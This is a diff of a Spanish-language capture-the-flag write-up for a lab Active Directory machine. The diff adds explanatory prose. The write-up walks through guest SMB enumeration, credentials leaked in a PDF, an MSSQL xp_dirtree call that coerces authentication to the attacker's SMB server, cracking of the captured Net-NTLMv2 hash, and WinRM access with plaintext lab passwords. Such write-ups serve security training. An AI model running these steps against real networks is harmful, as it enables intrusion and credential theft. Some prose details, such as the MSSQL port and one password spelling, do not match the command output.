@@ -300,6 +300,8 @@ Nicole.Thompson
 
 Dado que disponemos de una lista potencial de usuarios válidos del dominio, probaremos de realizar un `AS-REP Roast Attack` para lograr obtener un `Ticket Granting Ticket` (`TGT`) de aquellos usuarios que tengan asignado el `DONT_REQ_PREAUTH` de Kerberos.
 
+En este caso, no logramos obtener ningún hash debido que ningún usuario tenía la flag marcada.
+
 ```bash
 ❯ impacket-GetNPUsers -no-pass -usersfile users.txt sequel.htb/ 2>/dev/null
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -318,7 +320,9 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 
 ## SMB Enumeration
 
+A través del usuario `guest` (Invitado) realizaremos una enumeración de los recursos compartidos del sistema para verificar si a través de este usuario tenemos acceso algún recurso compartido.
 
+En el resultado obtenido, verificamos que tenemos acceso al recurso compartido `Public` con permisos de `READ`.
 
 ```bash
 ❯ nxc smb 10.10.11.202 -u 'guest' -p '' --shares
@@ -335,7 +339,9 @@ SMB         10.10.11.202    445    DC               Public          READ
 SMB         10.10.11.202    445    DC               SYSVOL                          Logon server share 
 ```
 
+Mediante el módulo de `spider_plus` realizaremos una enumeración de los recursos compartidos para que se nos genere un archivo `JSON` con la estructura de los archivos que se encuentran en los diferentes recursos compartidos.
 
+Esto es bastante útil para disponer de un **mapa** de los recursos compartidos y así localizar de manera más eficaz aquellos archivos que sean más interesantes.
 
 ```bash
 ❯ nxc smb 10.10.11.202 -u 'guest' -p '' -M spider_plus
@@ -368,9 +374,7 @@ SPIDER_PLUS 10.10.11.202    445    DC               [*] File size min:        48
 SPIDER_PLUS 10.10.11.202    445    DC               [*] File size max:        48.39 KB
 ```
 
-
-
-
+Del archivo que se nos genera a través del `spider_plus`, comprobaremos el contenido de este. En el resultado se nos muestra que en los recursos compartidos del `DC` solamente se encuentra un archivo llamado `SQL Server Procedures.pdf` en el recurso compartido `Public`.
 
 ```bash
 ❯ cat /tmp/nxc_hosted/nxc_spider_plus/10.10.11.202.json | jq
@@ -386,7 +390,7 @@ SPIDER_PLUS 10.10.11.202    445    DC               [*] File size max:        48
 }
 ```
 
-
+Descargaremos este archivo a través de `nxc` y lo almacenaremos con el nombre `SQLServerProcedures.pdf`.
 
 ```bash
 ❯ nxc smb 10.10.11.202 -u 'guest' -p '' --share 'Public' --get-file 'SQL Server Procedures.pdf' SQLServerProcedures.pdf
@@ -396,45 +400,19 @@ SMB         10.10.11.202    445    DC               [*] Copying "SQL Server Proc
 SMB         10.10.11.202    445    DC               [+] File "SQL Server Procedures.pdf" was downloaded to "SQLServerProcedures.pdf"
 ```
 
-
-
 ## Information Leakage
 
-
+Al visualizar el contenido del PDF descargado, se comprueba que en el apartado de `Bonus` se muestran credenciales de acceso a la base de datos de `MSSQL`.
 
 <figure><img src="../../.gitbook/assets/imagen (422).png" alt=""><figcaption></figcaption></figure>
 
-
-
-
-
-```bash
-❯ echo 'PublicUser' >> users.txt
-
-❯ nxc smb 10.10.11.202 -u users.txt -p 'GuestUserCantWrite1' --continue-on-success
-SMB         10.10.11.202    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
-SMB         10.10.11.202    445    DC               [-] sequel.htb\Administrator:GuestUserCantWrite1 STATUS_LOGON_FAILURE 
-SMB         10.10.11.202    445    DC               [-] sequel.htb\Guest:GuestUserCantWrite1 STATUS_LOGON_FAILURE 
-SMB         10.10.11.202    445    DC               [-] sequel.htb\krbtgt:GuestUserCantWrite1 STATUS_LOGON_FAILURE 
-SMB         10.10.11.202    445    DC               [-] sequel.htb\DC$:GuestUserCantWrite1 STATUS_LOGON_FAILURE 
-SMB         10.10.11.202    445    DC               [-] sequel.htb\Tom.Henn:GuestUserCantWrite1 STATUS_LOGON_FAILURE 
-SMB         10.10.11.202    445    DC               [-] sequel.htb\Brandon.Brown:GuestUserCantWrite1 STATUS_LOGON_FAILURE 
-SMB         10.10.11.202    445    DC               [-] sequel.htb\Ryan.Cooper:GuestUserCantWrite1 STATUS_LOGON_FAILURE 
-SMB         10.10.11.202    445    DC               [-] sequel.htb\sql_svc:GuestUserCantWrite1 STATUS_LOGON_FAILURE 
-SMB         10.10.11.202    445    DC               [-] sequel.htb\James.Roberts:GuestUserCantWrite1 STATUS_LOGON_FAILURE 
-SMB         10.10.11.202    445    DC               [-] sequel.htb\Nicole.Thompson:GuestUserCantWrite1 STATUS_LOGON_FAILURE 
-SMB         10.10.11.202    445    DC               [+] sequel.htb\PublicUser:GuestUserCantWrite1 (Guest)
-```
-
-
-
 ## Initial Foothold
-
-
 
 ### MSSQL Enumeration
 
+Dado que el servicio de `MSSQL` se encuentra expuesto por el puerto `3306`, probaremos de autenticarnos con las credenciales obtenidas `PublicUser/GuestUserCanWrite1`.&#x20;
 
+Comprobamos el acceso al servicio y realizamos una enumeración de las bases de datos presentes, en el cual no obtenemos ninguna base de datos que podamos extraer información útil.
 
 ```bash
 ❯ impacket-mssqlclient sequel.htb/'PublicUser':'GuestUserCantWrite1'@10.10.11.202 2>/dev/null
@@ -462,7 +440,7 @@ msdb                     1
 
 ### Attempting to enable xp\_cmdshell component in MSSQL \[FAILED]
 
-
+Probaremos de habilitar el compontente `xp_cmdshell` para tratar de obtener una vía potencial de lograr ejecutar comandos arbitrarios en el sistema. En este caso, se nos muestra que no disponemos del acceso necesario para habilitar el componente y lograr obtener finalmente el `RCE`.
 
 ```bash
 SQL (PublicUser  guest@master)> EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
@@ -472,11 +450,11 @@ ERROR(DC\SQLMOCK): Line 62: The configuration option 'xp_cmdshell' does not exis
 ERROR(DC\SQLMOCK): Line 1: You do not have permission to run the RECONFIGURE statement.
 ```
 
-
-
 ### MSSQL Hash Stealing \[Net-NTLMv2] (xp\_dirtree)
 
+En este punto, lo que realizaremos es intentar abusar del componente `xp_dirtree` para obtener un hash `Net-NTLMv2` del usuario que ejecuta el servicio de `MSSQL.` Básicamente, lo que intentaremos realizar es que el servicio de `MSSQL` se intente autenticar en nuestro servidor `SMB` que montaremos, para así lograr obtener el hash y posteriormente intentar crackearlo.
 
+Desde nuestro equipo montaremos un servidor `SMB` con `impacket` a través del siguiente comando.
 
 ```bash
 ❯ smbserver.py smbFolder $(pwd) -smb2support
@@ -489,7 +467,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Config file parsed
 ```
 
-
+Desde el servicio de `MSSQL` intentaremos listar el contenido de nuestro recurso que estamos compartiendo.
 
 ```bash
 SQL (PublicUser  guest@master)> EXEC Master.dbo.xp_dirtree"\\10.10.16.3\x",1,1;
@@ -498,7 +476,7 @@ subdirectory   depth   file
 SQL (PublicUser  guest@master)>
 ```
 
-
+Verificamos nuevamente en nuestro servidor `SMB` que hemos logrado obtener un hash `Net-NTLMv2` del usuario que ha intentado autenticarse a nuestro servidor. En este caso, el usuario se trata de `sql_svc`.
 
 ```bash
 ❯ smbserver.py smbFolder $(pwd) -smb2support
@@ -517,7 +495,7 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Remaining connections []
 ```
 
-
+A través de `hashcat` logramos finalmente crackear el hash del usuario mencionado.
 
 ```bash
 ❯ hashcat -a 0 hashes /usr/share/wordlists/rockyou.txt
@@ -538,7 +516,9 @@ Do NOT report auto-detect issues unless you are certain of the hash type.
 SQL_SVC::sequel:aaaaaaaaaaaaaaaa:e88ef89eb51ddb11681649f6078294fe:010100000000000080cbce391483db01e9c1c347e2fa202900000000010010006d006c004300430052006b0066006d00030010006d006c004300430052006b0066006d00020010006500610050004a007000710057007100040010006500610050004a0070007100570071000700080080cbce391483db01060004000200000008003000300000000000000000000000003000008e95df638ff6f53618e3a9748a9c51690f0ea0b3d458d87764b8c66a702fd6500a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0033000000000000000000:REGGIE1234ronnie
 ```
 
+Validaremos a través de `nxc` de las credenciales obtenidas para verificar que podemos autenticarnos correctamente.
 
+Por otro lado, probamos de verificar si teníamos capacidad de conectarnos directamente al `DC` a través de `WinRM`. En e resultado se nos muestra el mensaje como `Pwn3d!`, con lo cual nos confirma de que podemos conectarnos remotamente al equipo con dichas credenciales.
 
 ```bash
 ❯ nxc smb 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
@@ -549,7 +529,7 @@ WINRM       10.10.11.202    5985   DC               [*] Windows 10 / Server 2019
 WINRM       10.10.11.202    5985   DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
 ```
 
-
+A través de `evil-winrm` comprobamos que logramos obtener acceso remoto al `Domain Controller`.
 
 ```bash
 ❯ evil-winrm -i 10.10.11.202 -u 'sql_svc' -p 'REGGIE1234ronnie'
@@ -568,7 +548,7 @@ Info: Establishing connection to remote endpoint
 
 ### Information Leakage
 
-
+Realizando una enumeración del equipo, localizamos un archivo llamado `ERRORLOG.BAK` localizado en `C:\SQLServer\Logs`. Este archivo quizás pueda tener información que nos pueda servir más adelante, por lo tanto nos lo descargaremos a través del comando `download` que nos proporciona `evil-winrm`.
 
 ```powershell
 *Evil-WinRM* PS C:\SQLServer\Logs> ls
@@ -589,7 +569,7 @@ Info: Downloading C:\SQLServer\Logs\ERRORLOG.BAK to ERRORLOG.BAK
 Info: Download successful!
 ```
 
-
+Analizando el archivo `ERRORLOG.BAK` logramos verificar en los logs un intento de inicio de sesión del usuario `Ryan.Cooper` en el cual nos aparece las credenciales en texto plano de dicho usuario.
 
 {% code title="ERRORLOG.BAK" %}
 ```bash
@@ -601,7 +581,7 @@ Info: Download successful!
 
 ### Abusing WinRM - EvilWinRM
 
-
+Verificaremos de que las credenciales son válidas para el usuario mencionado y si tenemos capacidad de conectarnos al equipo. Al comprobar el acceso, nos conectaremos al `DC` y verificaremos la flag **user.txt**.
 
 ```bash
 ❯ nxc winrm 10.10.11.202 -u 'Ryan.Cooper' -p 'NuclearMosquito3'
@@ -617,7 +597,7 @@ Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplay
                                         
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> type ../Desktop/user.txt
-4b79e2057279cc62d102952efa6f1bfd
+4b79e2057279*********************
 ```
 
 ## Privilege Escalation
